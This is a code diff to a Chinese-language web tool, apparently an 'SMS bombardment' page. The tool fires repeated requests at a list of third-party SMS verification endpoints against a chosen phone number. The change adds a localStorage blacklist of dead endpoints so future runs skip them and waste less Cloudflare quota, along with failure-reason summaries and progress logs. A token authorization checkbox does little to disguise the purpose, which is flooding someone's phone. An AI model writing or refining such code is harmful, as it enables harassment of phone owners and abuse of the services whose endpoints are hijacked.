@@ -160,6 +160,37 @@ button:hover {
             color: #00ff9d;
         }
 
+        /* 失效接口提示条 */
+        .dead-note {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 0 0 16px;
+            padding: 8px 14px;
+            font-size: 13px;
+            color: #ffa502;
+            border: 1px dashed #4a3a1a;
+            border-radius: 5px;
+        }
+
+        .dead-note.visible {
+            display: flex;
+        }
+
+        .dead-note button {
+            margin: 0;
+            padding: 3px 10px;
+            font-size: 12px;
+            color: #ffa502;
+            border: 1px solid #ffa502;
+        }
+
+        .dead-note button:hover {
+            color: #05080c;
+            background-color: #ffa502;
+        }
+
 .card {
     background-color: #05080c;
     border: 1px solid #00ff9d;
@@ -341,6 +372,11 @@ button:hover {
             <input type="checkbox" id="authorized">
             <span>我确认对该号码拥有测试授权</span>
         </label><br>
+
+        <div class="dead-note" id="deadNote">
+            <span id="deadNoteText"></span>
+            <button type="button" id="resetDeadBtn">重置失效列表</button>
+        </div>
 
         <button type="button" id="sendBtn" class="btn-start" onclick="sendRequests()">📣 开始发送</button>
         <button type="button" id="stopBtn" class="btn-stop" onclick="stopRequests()">⏹️ 停止发送</button>
@@ -3736,13 +3772,49 @@ button:hover {
             return Math.min(max, Math.max(min, value));
         }
 
-        // 取出占比最高的失败原因，用于说明「到底为什么失败」
-        function topFailureReason(stats) {
+        // 失败原因分布摘要（取前 N 个）
+        function reasonSummary(stats, n = 3) {
             const entries = Object.entries(stats || {}).sort((a, b) => b[1] - a[1]);
-            if (!entries.length) return '未知';
-            const [reason, count] = entries[0];
-            const total = Object.values(stats).reduce((a, b) => a + b, 0);
-            return `「${reason}」×${count}（占失败 ${(count / total * 100).toFixed(0)}%）`;
+            if (!entries.length) return '无';
+            const total = entries.reduce((acc, [, c]) => acc + c, 0);
+            const head = entries.slice(0, n).map(([r, c]) => `${r}×${c}`).join('、');
+            const rest = entries.length > n ? ` 等 ${entries.length} 种原因` : '';
+            return `${head}${rest}（共 ${total} 次失败）`;
+        }
+
+        // ================================================================
+        // 已知失效接口记忆
+        // ================================================================
+        // 接口列表是 2024 年抓的快照，其中相当一部分已经下线或改参数了
+        // （404 / 400）。这类失败是永久性的，每次重跑都去打一遍纯属浪费：
+        // 既拖慢速度，又白白消耗 Cloudflare Functions 的 10 万次/天额度。
+        // 把确认失效的接口记到 localStorage，之后直接跳过。
+        // ================================================================
+        const DEAD_ENDPOINTS_KEY = 'sms_bombardment_dead_endpoints';
+        // 这两类是永久性失败：接口没了 / 参数对不上
+        const PERMANENT_FAILURES = new Set(['接口不存在', '参数错误']);
+
+        function loadDeadEndpoints() {
+            try {
+                const raw = localStorage.getItem(DEAD_ENDPOINTS_KEY);
+                return new Set(raw ? JSON.parse(raw) : []);
+            } catch (e) {
+                return new Set();
+            }
+        }
+
+        function saveDeadEndpoints(set) {
+            try {
+                localStorage.setItem(DEAD_ENDPOINTS_KEY, JSON.stringify([...set]));
+            } catch (e) { /* 隐私模式下写不了，忽略 */ }
+        }
+
+        // 取接口的稳定标识：动态 URL 去掉随机查询参数
+        function endpointKey(apiRequest, phoneNumber) {
+            const raw = typeof apiRequest.url === 'function'
+                ? apiRequest.url(phoneNumber, 1)
+                : apiRequest.url;
+            return String(raw).split('?')[0];
         }
         
         // 并发控制函数
@@ -3825,6 +3897,32 @@ button:hover {
         // 页面加载完成后自动聚焦到输入框
         window.addEventListener('load', function() {
             document.getElementById('phoneNumber').focus();
+            refreshDeadNote();
+        });
+
+        // 刷新失效接口提示条
+        function refreshDeadNote() {
+            const note = document.getElementById('deadNote');
+            const text = document.getElementById('deadNoteText');
+            if (!note || !text) return;
+            const count = loadDeadEndpoints().size;
+            if (count > 0) {
+                text.textContent = `已拉黑 ${count} 个失效接口，下次自动跳过`;
+                note.classList.add('visible');
+            } else {
+                note.classList.remove('visible');
+            }
+        }
+
+        // 重置失效接口列表
+        document.addEventListener('DOMContentLoaded', function() {
+            const btn = document.getElementById('resetDeadBtn');
+            if (!btn) return;
+            btn.addEventListener('click', function() {
+                localStorage.removeItem(DEAD_ENDPOINTS_KEY);
+                refreshDeadNote();
+                addLog('已重置失效接口列表，下次将重新尝试全部接口', 'system');
+            });
         });
 
        async function sendRequests() {
@@ -3896,10 +3994,24 @@ button:hover {
     // 每个接口执行的次数
     const REPEAT_COUNT = repeatCount;
 
+    // 跳过已知永久失效的接口
+    const deadEndpoints = loadDeadEndpoints();
+    let skippedCount = 0;
+    let newlyDeadCount = 0;
+
+    if (deadEndpoints.size > 0) {
+        addLog(`已跳过 ${deadEndpoints.size} 个已知失效接口（可在页面下方重置）`, 'system');
+    }
+
     for (let i = 0; i < times; i++) {
         // ⚡ 让每个接口循环执行多次
         for (let repeat = 0; repeat < REPEAT_COUNT; repeat++) {
             apiRequests.forEach((apiRequest) => {
+                // 已知永久失效的接口直接跳过，不再浪费请求和额度
+                if (deadEndpoints.has(endpointKey(apiRequest, phoneNumber))) {
+                    skippedCount++;
+                    return;
+                }
                 const requestData = apiRequest.data(phoneNumber, i + 1);
                 totalRequests++;
 
@@ -4000,6 +4112,17 @@ button:hover {
                         globalFailedCount++;
                         consecutiveFailures++;
                         reasonStats[failReason] = (reasonStats[failReason] || 0) + 1;
+
+                        // 永久性失败（接口下线 / 参数失效）记入黑名单，后续直接跳过
+                        if (PERMANENT_FAILURES.has(failReason)) {
+                            const key = endpointKey(apiRequest, phoneNumber);
+                            if (!deadEndpoints.has(key)) {
+                                deadEndpoints.add(key);
+                                saveDeadEndpoints(deadEndpoints);
+                                newlyDeadCount++;
+                            }
+                        }
+
                         console.warn(`❌ [${status}] ${apiRequest.method || 'POST'} 失败(${failReason}) (${duration}ms): ${actualUrl}`);
                         
                         // 显示部分失败日志（前5个 + 每20个显示一次）
@@ -4012,13 +4135,13 @@ button:hover {
                             isRunning = false;
                             stoppedEarly = true;
                             addLog(`⚠️ 连续失败${consecutiveFailures}次，已自动停止`, 'error');
-                            addLog(`💡 主要失败原因：${topFailureReason(reasonStats)}`, 'info');
+                            addLog(`💡 停止前的失败原因分布：${reasonSummary(reasonStats, 3)}`, 'info');
                             console.error(`🛑 连续失败${consecutiveFailures}次，自动停止发送`);
                         }
                     }
                     
-                    // 每10个已触发显示一次进度
-                    if (sentCount > 0 && sentCount % 10 === 0) {
+                    // 进度反馈：每完成 20 个请求打一次，避免长时间没有输出
+                    if (completedRequests % 20 === 0) {
                         console.log(`📊 进度: ${completedRequests}/${totalRequests} | 已触发: ${sentCount} | 未确认: ${unknownCount} | 失败: ${failedCount}`);
                         addLog(`进度 ${completedRequests}/${totalRequests} · 已触发 ${sentCount} · 未确认 ${unknownCount} · 失败 ${failedCount}`, 'system');
                     }
@@ -4099,6 +4222,12 @@ button:hover {
     if (stoppedEarly || completedRequests < totalRequests) {
         addLog(`计划 ${totalRequests} 个，实际完成 ${completedRequests} 个${stoppedEarly ? '（提前停止）' : ''}`, 'system');
     }
+
+    // 失效接口黑名单情况
+    if (skippedCount > 0 || newlyDeadCount > 0) {
+        addLog(`跳过失效接口 ${skippedCount} 次${newlyDeadCount > 0 ? `，本次新发现 ${newlyDeadCount} 个` : ''}（累计 ${deadEndpoints.size} 个已拉黑）`, 'system');
+    }
+    refreshDeadNote();
     
     // 显示完整统计
     if (sentCount > 0) {
@@ -4113,8 +4242,7 @@ button:hover {
     
     // 失败原因分布：让用户知道到底卡在哪
     if (failedCount > 0) {
-        const topReasons = Object.entries(reasonStats).sort((a, b) => b[1] - a[1]).slice(0, 3);
-        addLog(`失败主因: ${topReasons.map(([r, c]) => `${r}×${c}`).join('、')}`, 'error');
+        addLog(`失败原因: ${reasonSummary(reasonStats, 4)}`, 'error');
     }
     
     addLog(`⏱️ 耗时: ${totalTime}秒`, 'info');
